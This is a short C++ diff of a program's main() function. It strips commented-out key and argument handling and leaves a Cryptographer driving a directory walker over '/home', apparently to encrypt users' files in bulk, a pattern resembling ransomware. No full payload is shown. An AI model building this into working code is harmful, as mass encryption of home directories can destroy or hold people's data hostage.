@@ -4,19 +4,8 @@
 #include <fstream>
 
 int main(int argc, char **argv) {
-	//InpArgsCorrector correctInput(argc, argv);
 
     auto coolCryptor(std::make_shared<Cryptographer>());
-    //std::cout << correctInput.actualKey() << std::endl;
-    //std::cout << correctInput.actualPath() << std::endl;
-    //if(correctInput.actualKey() == "--keyGen") {
-     //   coolCryptor->generateKey();
-     //   coolCryptor->generateIV();
-   // }
-    //else
-      //  coolCryptor->setKey(correctInput.actualKey());
-    
-    
 
     Walker shadowWalker("/home", coolCryptor);
    // coolCryptor->willEncrypt(correctInput.wannaEncrypt());
